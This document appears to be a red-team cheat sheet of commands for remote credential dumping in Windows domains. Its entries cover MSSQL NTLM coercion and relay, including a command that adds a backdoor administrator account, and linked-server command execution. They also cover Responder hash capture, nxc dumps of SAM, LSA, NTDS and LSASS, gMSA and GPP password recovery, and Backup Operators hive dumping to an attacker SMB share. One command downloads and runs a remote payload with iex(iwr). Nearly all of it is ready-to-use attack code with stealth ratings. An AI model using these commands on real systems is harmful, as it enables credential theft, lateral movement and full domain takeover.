# Credential Dumping — Remote & Network

## MSSQL → NTLM Coerce → Relay

### xp_dirtree NTLM Coercion from MSSQL [added: 2026-04]
- **Tags:** #MSSQL #xp_dirtree #NTLMCoercion #NTLMRelay #Impacket #SMBRelay #T1187
- **Trigger:** Low-priv MSSQL access obtained; SQL service account may have admin rights elsewhere
- **Prereq:** MSSQL access (even low-priv), attacker-controlled SMB listener (ntlmrelayx or Responder)
- **Yields:** NetNTLMv2 hash of SQL service account for cracking, or relayed authentication for RCE/admin
- **Opsec:** Med
- **Context:** Low-priv MSSQL access with no linked servers — force SQL service account to authenticate to attacker's SMB share, relay or crack hash
- **Payload/Method:**
  ```sql
  -- Trigger outbound NTLM auth from SQL service account
  EXEC master..xp_dirtree "\\<attacker-ip>\share"
  ```
  ```bash
  # Capture and relay to gain local admin (if service account has admin elsewhere)
  sudo impacket-ntlmrelayx --no-http-server -smb2support \
    -t <target-ip> -c "net user hacker Password123 /add && net localgroup administrators hacker /add"
  # Leave out -c to attempt secretsdump instead
  ```

## MSSQL Linked Server Lateral Movement

### MSSQL Linked Servers — Execute Commands Across DB Chains [added: 2026-04]
- **Tags:** #MSSQL #LinkedServers #xp_cmdshell #PowerUpSQL #CrossForest #LateralMovement #T1210
- **Trigger:** MSSQL access obtained; linked servers may exist running as SA or privileged accounts
- **Prereq:** MSSQL access, PowerUpSQL or manual SQL queries, linked servers configured
- **Yields:** Command execution on linked SQL servers (potentially cross-forest), SA-level access
- **Opsec:** Med
- **Context:** MSSQL access — linked servers may run as `sa` or privileged accounts, even in other forests
- **Payload/Method:**
  ```sql
  -- Find linked servers
  EXEC sp_linkedservers

  -- Run query on linked server
  SELECT mylogin FROM OPENQUERY("DC01", 'SELECT SYSTEM_USER AS mylogin')

  -- Enable xp_cmdshell on linked server and execute commands
  EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
  EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
  EXEC ('xp_cmdshell ''whoami''') AT DC01
  ```
  ```powershell
  # PowerUpSQL — automatic linked server crawl + command exec
  Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links

  # Execute command on any linked server with xp_cmdshell enabled
  Get-SqlServerLinkCrawl -Instance dcorp-mssql \
    -Query 'EXEC xp_cmdshell ''whoami'''

  # Scan for misconfigs (escalate to SA)
  Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV
  ```

## Network Credential Capture

### NTLMv2 Hash Capture via Responder (Linux) [added: 2026-04]
- **Tags:** #Responder #NTLMv2 #LLMNR #NBTNS #Poisoning #HashCapture #T1557.001
- **Trigger:** On network with Linux attack box; broadcast name resolution traffic observed
- **Prereq:** Linux attack box on target subnet, Responder installed, root/sudo privileges
- **Yields:** NTLMv2 hashes from Windows hosts for offline cracking
- **Opsec:** Med
- **Context:** On the network with a Linux attack box -- poison LLMNR/NBT-NS to capture NTLMv2 hashes from Windows hosts making name resolution requests
- **Payload/Method:**
  ```bash
  # Active poisoning mode
  sudo responder -I ens224

  # Crack captured NTLMv2 hashes
  hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
  ```

### Impacket SMB Server for File Transfer [added: 2026-04]
- **Tags:** #Impacket #SMBServer #FileTransfer #NTLMCapture #smbserver #Exfiltration #T1071.002
- **Trigger:** Need to host files for target download or capture NTLM auth against a controlled SMB share
- **Prereq:** Impacket installed on Linux attack box, network access to/from target
- **Yields:** File hosting for target download; optional NTLM hash capture from connecting clients
- **Opsec:** Med
- **Context:** Need to host files for download by target or capture NTLM auth attempts against a controlled SMB share
- **Payload/Method:** `impacket-smbserver -ip <ATTACKER_IP> -smb2support -username user -password password shared /path/to/files/`

## nxc Remote Credential Extraction

### nxc Remote Credential Extraction (SAM/LSA/NTDS) [added: 2026-04]
- **Tags:** #nxc #NetExec #SAM #LSA #NTDS #RemoteDump #secretsdump #T1003
- **Trigger:** Admin access via SMB to target; need remote credential extraction without Mimikatz on target
- **Prereq:** Admin credentials (password or hash) with SMB access to target, nxc installed
- **Yields:** Local SAM hashes, LSA secrets, or full domain NTDS hashes depending on method
- **Opsec:** High
- **Context:** Admin access via SMB. Dump credentials remotely without touching target with Mimikatz.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> --sam              # Local SAM hashes
  nxc smb <target> -u <u> -p <p> --lsa              # LSA secrets (service account creds)
  nxc smb <target> -u <u> -p <p> --ntds             # Domain hashes via drsuapi
  nxc smb <target> -u <u> -p <p> --ntds vss         # Domain hashes via Volume Shadow Copy
  ```

### nxc LSASS Dump Modules (Multiple Methods) [added: 2026-04]
- **Tags:** #nxc #LSASS #lsassy #procdump #nanodump #handlekatz #CredentialDumping #T1003.001
- **Trigger:** Admin access via SMB; need to choose LSASS dump method based on AV/EDR present
- **Prereq:** Admin credentials with SMB access, nxc with desired module installed
- **Yields:** LSASS memory dump parsed for NTLM hashes, Kerberos tickets, cleartext passwords
- **Opsec:** Med
- **Context:** Admin access. Choose dump method based on AV/EDR present on target. nanodump has smallest footprint.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -M lsassy          # pypykatz-based (most reliable)
  nxc smb <target> -u <u> -p <p> -M procdump         # Sysinternals procdump
  nxc smb <target> -u <u> -p <p> -M handlekatz       # handlekatz (uses handle duplication)
  nxc smb <target> -u <u> -p <p> -M nanodump          # nanodump (smallest, stealthiest)
  ```

### nxc GMSA Password Retrieval [added: 2026-04]
- **Tags:** #nxc #gMSA #ManagedServiceAccount #LDAP #msDS-ManagedPassword #CredentialAccess #T1003
- **Trigger:** gMSA accounts found in domain; authenticated user may have read permission on managed password
- **Prereq:** Authenticated domain user, nxc installed, LDAP access to DC
- **Yields:** NTLM hash of gMSA service account
- **Opsec:** Low
- **Context:** Authenticated domain user. Retrieve Group Managed Service Account passwords if account has read permission.
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> --gmsa`

### nxc GPP Password + Autologin Recovery [added: 2026-04]
- **Tags:** #nxc #GPPPasswords #cpassword #Autologin #SYSVOL #LegacyCreds #T1552.006
- **Trigger:** Legacy domain environment; SYSVOL may contain old Group Policy Preferences with passwords
- **Prereq:** Valid domain credentials with SYSVOL read access, nxc installed
- **Yields:** Plaintext passwords from legacy GPP XML files or autologin registry entries
- **Opsec:** Low
- **Context:** Legacy Group Policy Preferences may still contain cPasswords on SYSVOL.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -M gpp_password
  nxc smb <target> -u <u> -p <p> -M gpp_autologin
  ```

### Backup Operators NTDS Dump via reg.py (horizon3ai) [added: 2026-04]
- **Tags:** #BackupOperators #NTDS #DCSync #PrivEsc #Impacket #RegistryDump
- **Trigger:** BloodHound shows user is member of BACKUP OPERATORS group; no direct DA
- **Prereq:** Valid plaintext creds for BACKUP OPERATORS member; Impacket installed; SMB share reachable from DC; interactive logon (RunAsCs -l 2 may be needed to bypass network auth restrictions)
- **Yields:** SAM/SYSTEM/SECURITY hive dump → NTLM hashes for all domain accounts via secretsdump
- **Opsec:** Med
- **Context:** BACKUP OPERATORS have SeBackupPrivilege which allows reading any file. reg.py from horizon3ai automates dumping registry hives over SMB. secretsdump then extracts all domain hashes locally.
- **Payload/Method:**
  ```bash
  # Attacker: stand up SMB share
  sudo impacket-smbserver share adlab/ -smb2support
  mkdir adlab

  # Dump hives to attacker share
  python3 reg.py '<user>:<pass>'@<DC_IP> backup -p '\\<ATTACKER_IP>\share'
  # Source: https://raw.githubusercontent.com/horizon3ai/backup_dc_registry/main/reg.py

  # Extract all hashes locally
  impacket-secretsdump LOCAL -system ./adlab/SYSTEM -security ./adlab/SECURITY -sam ./adlab/SAM

  # DCSync using machine account hash
  impacket-secretsdump '<domain>/<DC_HOSTNAME>$'@<DC_FQDN> -hashes aad3b435b51404eeaad3b435b51404ee:<MACHINE_NT_HASH>
  ```
  > Note: If running from non-interactive shell (Evil-WinRM), use RunAsCs -l 2 first:
  > `.\RunAsCs.exe -l 2 <user> <pass> -d <domain> 'powershell iex(iwr -useb <payload>)'`
